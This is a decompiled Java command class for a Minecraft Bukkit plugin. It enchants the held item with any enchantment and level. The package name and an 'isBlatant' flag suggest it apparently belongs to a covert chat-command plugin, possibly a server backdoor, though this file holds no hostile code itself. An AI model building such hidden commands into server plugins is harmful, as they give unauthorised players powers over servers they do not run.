/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Material
 *  org.bukkit.enchantments.EnchantmentWrapper
 *  org.bukkit.entity.Player
 *  org.bukkit.inventory.ItemStack
 *  org.bukkit.inventory.meta.ItemMeta
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.Material;
import org.bukkit.NamespacedKey;
import org.bukkit.enchantments.EnchantmentWrapper;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.enchantments.Enchantment;
public class EnchantCommand
extends Command {
    private int level;


    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        Enchantment enchantment = EnchantmentWrapper.getByKey(NamespacedKey.minecraft(args[1].toLowerCase()));
        if (args.length <= 2) {
            p2.sendMessage(Settings.USAGE("enchant <enchantment> <level>"));
        } 
        
        else 
        
        {
            ItemStack item = p2.getInventory().getItemInMainHand();
            if (item.getType() == Material.AIR) {
                p2.sendMessage(Settings.PREFIX("You aren't holding anything!"));
            } 
            
            else 
            
            {
                ItemMeta meta = item.getItemMeta();
                
                if (enchantment == null) {
                    p2.sendMessage(Settings.PREFIX("This enchantment wasn't found!"));
                } 
                
                else 
                
                {
                    try {
                        this.level = Integer.parseInt(args[2].toUpperCase());
                    }
                    
                    catch (Exception e2) {
                        p2.sendMessage(Settings.PREFIX("Invalid integer (Max: 32727)"));
                        return;
                    }

                        if(meta.addEnchant(enchantment, this.level, true))
                        {
                            item.setItemMeta(meta);
                            p2.sendMessage(Settings.PREFIX("Your item was enchanted with " + Settings.RED + args[1] + " " + this.level));
                        }
                        else
                        {
                            p2.sendMessage(Settings.PREFIX("Failed to add enchantment"));
                        }
                }
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

